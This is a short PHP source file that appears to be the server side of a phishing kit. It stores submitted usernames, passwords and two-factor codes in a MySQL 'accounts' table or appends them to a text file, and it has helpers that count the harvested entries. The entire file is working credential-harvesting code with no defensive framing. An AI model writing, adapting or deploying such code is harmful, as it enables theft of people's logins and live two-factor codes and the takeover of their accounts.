<?php
require('settings.php');

function getCountDB() {
	try {
		$dsn = sprintf('mysql:host=%s;dbname=%s;charset=%s', MYSQL_HOST, MYSQL_DBNAME, MYSQL_CHARSET);

		$opt = array(
			PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
		);

		$db = new PDO($dsn, MYSQL_USER, MYSQL_PASS, $opt);
	} catch(Exception $e) {
		exit('ERROR DB!!');
	}

	$sql = 'SELECT COUNT(*) AS count FROM `accounts`';

	$res = $db -> prepare($sql);
	$res -> execute();
	$res = ($res -> fetch())['count'];

	return $res;
}

function getCountFile() {
	$file = sprintf('../SAVE/%s',
		TITLE_FILE_ACCOUNTS);

	$size = filesize($file);

	return $size;
}

function goDB() {
	try {
		$dsn = sprintf('mysql:host=%s;dbname=%s;charset=%s', MYSQL_HOST, MYSQL_DBNAME, MYSQL_CHARSET);

		$opt = array(
			PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
		);

		$db = new PDO($dsn, MYSQL_USER, MYSQL_PASS, $opt);
	} catch(Exception $e) {
		exit('ERROR DB!!');
	}

	$sql = 'INSERT INTO `accounts` (`email`, `password`, `guard`) VALUES (?, ?, ?)';

	$res = $db -> prepare($sql);
	return $res -> execute(
		array(
			$_POST['username'],
			$_POST['passwordO'],
			$_POST['twofactorcode']
		)
	);
}

function goFile() {
	$file = sprintf('../SAVE/%s',
		TITLE_FILE_ACCOUNTS);

	$current = file_get_contents($file);

	if(!empty($_POST['twofactorcode'])) {
		$current .= sprintf("%s%s%s%s%s\n",
			$_POST['username'], SPLIT_SYMBOL, $_POST['passwordO'], SPLIT_SYMBOL, $_POST['twofactorcode']);
	} else {
		$current .= sprintf("%s%s%s\n",
			$_POST['username'], SPLIT_SYMBOL, $_POST['passwordO']);
	}

	file_put_contents($file, $current);
}
?>